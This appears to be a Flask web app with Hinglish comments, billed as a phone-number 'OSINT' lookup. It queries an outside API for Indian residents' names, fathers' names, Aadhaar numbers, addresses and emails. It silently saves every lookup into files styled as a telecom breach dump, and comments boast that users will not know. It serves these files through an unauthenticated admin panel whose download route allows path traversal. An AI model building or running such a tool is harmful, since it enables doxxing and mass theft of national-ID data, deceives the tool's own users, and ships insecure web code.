from flask import Flask, request, render_template_string, jsonify
import requests
import json
import os
import hashlib
from datetime import datetime

app = Flask(__name__)

# ✅ API Configuration
API_KEY = "demo"
API_URL = "https://exploitsindia.site/osint/api.php"

# ✅ Data leak folder - yahan saari files save hongi
LEAK_FOLDER = "leaked_data"
if not os.path.exists(LEAK_FOLDER):
    os.makedirs(LEAK_FOLDER)

# ✅ File to track already saved numbers
SAVED_NUMBERS_FILE = os.path.join(LEAK_FOLDER, ".saved_numbers.json")

def load_saved_numbers():
    """Already saved numbers ki list load karo"""
    if os.path.exists(SAVED_NUMBERS_FILE):
        with open(SAVED_NUMBERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_number_to_tracker(number):
    """Number ko tracker mein add karo"""
    saved = load_saved_numbers()
    if number not in saved:
        saved.append(number)
        with open(SAVED_NUMBERS_FILE, 'w') as f:
            json.dump(saved, f, indent=2)

def is_number_already_saved(number):
    """Check karo ki number already save hai ya nahi"""
    return number in load_saved_numbers()

def generate_filename(number, data):
    """Leaked data style filename generate karo"""
    # Format: INDIA_TELECOM_LEAK_2026_PHONE_9876543210_TIMESTAMP.json
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    hash_id = hashlib.md5(f"{number}_{timestamp}".encode()).hexdigest()[:8]
    
    name = data[0].get('name', 'UNKNOWN') if data else 'UNKNOWN'
    name_clean = name.replace(' ', '_').replace('.', '')[:20]
    
    filename = f"INDIA_LEAK_{name_clean}_{number}_{hash_id}.json"
    return filename

def save_leaked_data(number, api_data):
    """Data leak style mein data save karo"""
    if is_number_already_saved(number):
        print(f"[!] {number} already saved - skipping")
        return None, False
    
    filename = generate_filename(number, api_data)
    filepath = os.path.join(LEAK_FOLDER, filename)
    
    # Leaked data format - jesa dark web pe milta hai
    leak_format = {
        "_metadata": {
            "source": "INDIAN_TELECOM_DATABASE_LEAK_2026",
            "leak_id": hashlib.md5(number.encode()).hexdigest()[:12],
            "extracted_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "extracted_by": "PYAURA_OSINT_ENGINE",
            "api_source": "exploitsindia.site",
            "breach_reference": "TELECOM_INDIA_815M_LEAK"
        },
        "target": {
            "phone": number,
            "phone_hash": hashlib.sha256(number.encode()).hexdigest()
        },
        "records": api_data
    }
    
    with open(filepath, 'w') as f:
        json.dump(leak_format, f, indent=2, ensure_ascii=False)
    
    # Tracker mein add karo
    save_number_to_tracker(number)
    
    print(f"[✅] DATA LEAK SAVED: {filename}")
    return filename, True

def get_all_leaked_files():
    """Saari leaked files ki list lao"""
    files = []
    for f in os.listdir(LEAK_FOLDER):
        if f.endswith('.json') and not f.startswith('.'):
            filepath = os.path.join(LEAK_FOLDER, f)
            stats = os.stat(filepath)
            files.append({
                'name': f,
                'size': stats.st_size,
                'modified': datetime.fromtimestamp(stats.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                'path': filepath
            })
    return sorted(files, key=lambda x: x['modified'], reverse=True)

def get_total_records():
    """Total kitne records leak hue count karo"""
    total = 0
    for f in os.listdir(LEAK_FOLDER):
        if f.endswith('.json') and not f.startswith('.'):
            try:
                with open(os.path.join(LEAK_FOLDER, f), 'r') as fh:
                    data = json.load(fh)
                    total += len(data.get('records', []))
            except:
                pass
    return total

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>● PHONE_LOOKUP v2.0 ●</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;600;700;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --neon-cyan: #00f3ff;
            --neon-green: #00ff41;
            --neon-pink: #ff00aa;
            --neon-purple: #8b5cf6;
            --dark-bg: #0a0a0f;
            --dark-card: #0d0d1a;
            --dark-border: #1a1a3a;
        }
        body {
            background: var(--dark-bg);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            font-family: 'Share Tech Mono', monospace;
        }
        .container {
            background: var(--dark-card);
            width: 100%;
            max-width: 560px;
            border-radius: 16px;
            padding: 30px 24px 35px;
            border: 1px solid var(--dark-border);
            box-shadow: 0 0 30px rgba(0, 243, 255, 0.05);
        }
        .header { text-align: center; margin-bottom: 20px; }
        .glitch-title {
            font-family: 'Orbitron', monospace;
            font-weight: 900;
            font-size: clamp(16px, 4vw, 24px);
            color: var(--neon-cyan);
            text-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
            letter-spacing: 2px;
        }
        .sub { color: #6b6b8a; font-size: 11px; margin-top: 6px; }
        form { display: flex; flex-direction: column; gap: 12px; }
        input[type="text"] {
            width: 100%;
            padding: 14px 18px;
            border-radius: 10px;
            border: 1px solid #1a1a3a;
            background: rgba(0, 0, 0, 0.6);
            color: var(--neon-green);
            font-family: 'Share Tech Mono', monospace;
            font-size: 20px;
            letter-spacing: 3px;
            text-align: center;
            outline: none;
        }
        input[type="text"]:focus {
            border-color: var(--neon-cyan);
            box-shadow: 0 0 15px rgba(0, 243, 255, 0.15);
        }
        button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(135deg, rgba(0, 243, 255, 0.15), rgba(0, 255, 65, 0.1));
            color: var(--neon-cyan);
            font-family: 'Share Tech Mono', monospace;
            font-size: 16px;
            cursor: pointer;
            border: 1px solid rgba(0, 243, 255, 0.2);
            transition: all 0.3s;
        }
        button:hover {
            border-color: var(--neon-cyan);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
        }
        .result-box {
            margin-top: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 12px;
            border: 1px solid rgba(0, 255, 65, 0.15);
            overflow: hidden;
        }
        .result-header {
            background: rgba(0, 255, 65, 0.05);
            padding: 10px 16px;
            border-bottom: 1px solid rgba(0, 255, 65, 0.1);
            display: flex;
            justify-content: space-between;
        }
        .result-header .title { color: var(--neon-green); font-size: 11px; }
        .result-header .target-num { color: var(--neon-cyan); font-size: 13px; }
        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
        }
        .detail-label { color: #6b6b8a; font-size: 11px; }
        .detail-value { color: #e0e0ff; font-size: 12px; text-align: right; max-width: 55%; }
        .detail-value.found { color: var(--neon-green); }
        .error {
            margin-top: 16px;
            background: rgba(255, 0, 0, 0.08);
            border: 1px solid rgba(255, 0, 0, 0.25);
            border-radius: 10px;
            padding: 12px;
            color: #ff4444;
            text-align: center;
            font-size: 12px;
        }
        .footer {
            text-align: center;
            margin-top: 16px;
            padding-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.04);
            font-size: 10px;
            color: #2a2a4a;
        }
        .stats {
            text-align: center;
            font-size: 10px;
            color: #3a3a5a;
            margin-top: 8px;
        }
        .stats .num { color: var(--neon-pink); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="glitch-title">● PHONE_LOOKUP v2.0 ●</h1>
            <div class="sub">TARGETED_QUERY_ENGINE // DEMO_MODE</div>
        </div>

        <form method="POST" autocomplete="off">
            <input type="text" id="phone" name="phone" placeholder="+91 XXXXXXXXXX" 
                   value="{{ phone or '' }}" required maxlength="10" pattern="[0-9]{10}" inputmode="numeric">
            <button type="submit" id="submitBtn">⚡ EXECUTE_QUERY</button>
        </form>

        {% if result %}
        <div class="result-box">
            <div class="result-header">
                <span class="title">⫸ QUERY_RESULT</span>
                <span class="target-num">+91 {{ num }}</span>
            </div>
            <div class="result-body">
                {% for r in result %}
                <div class="detail-row">
                    <span class="detail-label">NAME</span>
                    <span class="detail-value found">{{ r.name }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">FATHER</span>
                    <span class="detail-value found">{{ r.fname }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">AADHAAR</span>
                    <span class="detail-value found">{{ r.aadhar }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">ADDRESS</span>
                    <span class="detail-value">{{ r.address }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">ALT_NUM</span>
                    <span class="detail-value">{{ r.alt }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">OPERATOR</span>
                    <span class="detail-value">{{ r.circle }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">EMAIL</span>
                    <span class="detail-value {% if r.email %}found{% endif %}">{{ r.email or 'N/A' }}</span>
                </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <div class="footer">◆ PYAURA_OSINT_ENGINE ◆ // SESSION_ACTIVE</div>
    </div>

    <script>
        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
        });
        document.querySelector('form').addEventListener('submit', function() {
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').textContent = '⏳ PROCESSING...';
        });
    </script>
</body>
</html>
"""

# ✅ Admin panel - leaked data dekhne ke liye (sirf aap access kar sakte ho)
ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>LEAKED DATA ADMIN</title>
    <style>
        body { background: #0a0a0f; color: #00ff41; font-family: monospace; padding: 20px; }
        h1 { color: #00f3ff; border-bottom: 1px solid #1a1a3a; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #1a1a3a; }
        th { color: #00f3ff; }
        td { color: #e0e0ff; font-size: 13px; }
        .stats-box { 
            background: #0d0d1a; border: 1px solid #1a1a3a; border-radius: 10px; 
            padding: 20px; margin-bottom: 20px; display: flex; gap: 40px;
        }
        .stat { text-align: center; }
        .stat .num { font-size: 32px; color: #ff00aa; font-weight: bold; }
        .stat .label { font-size: 11px; color: #6b6b8a; margin-top: 4px; }
        .file-link { color: #00ff41; text-decoration: none; }
        .file-link:hover { text-decoration: underline; }
        .badge { 
            display: inline-block; background: #ff00aa22; color: #ff00aa; 
            padding: 2px 8px; border-radius: 4px; font-size: 10px;
        }
    </style>
</head>
<body>
    <h1>⫸ LEAKED DATA ADMIN PANEL</h1>
    
    <div class="stats-box">
        <div class="stat">
            <div class="num">{{ total_files }}</div>
            <div class="label">TOTAL FILES</div>
        </div>
        <div class="stat">
            <div class="num">{{ total_records }}</div>
            <div class="label">TOTAL RECORDS</div>
        </div>
        <div class="stat">
            <div class="num">{{ unique_numbers }}</div>
            <div class="label">UNIQUE NUMBERS</div>
        </div>
    </div>
    
    <table>
        <tr>
            <th>#</th>
            <th>FILENAME</th>
            <th>SIZE</th>
            <th>DATE</th>
            <th>DOWNLOAD</th>
        </tr>
        {% for f in files %}
        <tr>
            <td>{{ loop.index }}</td>
            <td><span class="badge">LEAK</span> {{ f.name }}</td>
            <td>{{ f.size }} bytes</td>
            <td>{{ f.modified }}</td>
            <td><a href="/admin/download/{{ f.name }}" class="file-link">⬇ DOWNLOAD</a></td>
        </tr>
        {% endfor %}
    </table>
    
    <p style="margin-top: 20px; color: #3a3a5a; font-size: 11px;">
        ⚠ Total leaked records: {{ total_records }} | Last updated: {{ now }}
    </p>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    result = None
    error = None
    phone = ""

    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()

        if not phone or not phone.isdigit() or len(phone) != 10:
            error = "कृपया सिर्फ 10 अंकों का मोबाइल नंबर डालें"
        else:
            try:
                params = {'key': API_KEY, 'type': 'number', 'num': phone}
                resp = requests.get(API_URL, params=params, timeout=15)
                data = resp.json()

                if data.get('status') == 'success' and data.get('result'):
                    result = data['result']
                    
                    # ⚠️ USER KO BINA BATAYE DATA SAVE KARO (Silent Leak)
                    filename, is_new = save_leaked_data(phone, result)
                    if is_new:
                        print(f"[🔴] SILENT LEAK: {phone} → {filename}")
                    else:
                        print(f"[🔵] Already leaked: {phone}")
                else:
                    error = f"API से कोई डेटा नहीं मिला। {data.get('message', '')}"
            except Exception as e:
                error = f"त्रुटि: {str(e)}"

    return render_template_string(HTML_TEMPLATE, result=result, error=error, phone=phone, num=phone)

@app.route('/admin')
def admin_panel():
    """Leaked data admin panel - sirf aap access kar sakte ho"""
    files = get_all_leaked_files()
    total_records = get_total_records()
    saved_numbers = load_saved_numbers()
    
    return render_template_string(
        ADMIN_HTML,
        files=files,
        total_files=len(files),
        total_records=total_records,
        unique_numbers=len(saved_numbers),
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

@app.route('/admin/download/<filename>')
def download_leak(filename):
    """Leaked file download karo"""
    filepath = os.path.join(LEAK_FOLDER, filename)
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            data = json.load(f)
        return jsonify(data)
    return "File not found", 404

@app.route('/admin/stats')
def leak_stats():
    """Leak statistics JSON mein"""
    files = get_all_leaked_files()
    return jsonify({
        "total_files": len(files),
        "total_records": get_total_records(),
        "unique_numbers": len(load_saved_numbers()),
        "files": files
    })

if __name__ == '__main__':
    print("🔥 PyAura OSINT Leak Engine v1.0 चालू हो गया!")
    print("👉 Main Tool: http://127.0.0.1:5000")
    print(f"👉 Admin Panel: http://127.0.0.1:5000/admin")
    print(f"👉 Leak Stats: http://127.0.0.1:5000/admin/stats")
    print(f"👉 Leaked Data Folder: {LEAK_FOLDER}/")
    print("\n⚠️  Data SILENTLY leak ho raha hai - user ko pata nahi chalega!")
    app.run(debug=True, host='0.0.0.0', port=5000)